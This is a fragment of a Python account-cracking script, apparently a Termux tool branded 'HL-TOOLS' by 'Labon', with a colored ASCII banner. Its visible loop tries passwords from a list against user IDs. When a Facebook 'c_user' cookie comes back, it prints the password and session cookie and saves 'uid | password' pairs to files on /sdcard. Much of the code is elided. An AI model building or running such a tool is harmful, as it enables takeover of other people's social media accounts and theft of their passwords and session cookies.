...
║\033[1;35m        	 ║♥︎𝗪𝗘𝗟𝗖𝗢𝗠𝗘-HL-𝗧𝗢𝗢𝗟𝗦♥︎║\033[38;5;46m		            ║
\x1b[38;5;85m╚═══════════════════════════════════════════════════════════╝                                                          
                                                          
 \033[1;93m×××××××❤️××××××××××\033[1;93m××××××❤️××××××××\033[1;93m×××××××××××××××××××××××
 \033[38;5;57m×     \033[1;96m[✓] 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘\33[0;m   :  \033[1;96mLabon	     \033[38;5;46m           ×
 \033[38;5;57m×     \033[1;32m[✓] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊      : \033[1;34m Labon     		 	\033[38;5;46m×
 \033[38;5;57m×     \033[1;35m[✓] 𝐆𝐈𝐓𝐇𝐔𝐁       :  \033[1;35m𝗧𝗘𝗥𝗠𝗨𝗫-Labon          	\033[38;5;46m×
 ...
 \033[38;5;57m×     \033[1;36m[✓] 𝐓𝐎𝐎𝐋 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 :  \033[1;36mLabon-0.4      		\033[38;5;46m×
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[HL-Labon🤩💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HL-TANZID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/HL-Labon-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝐌𝐄-Labon{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
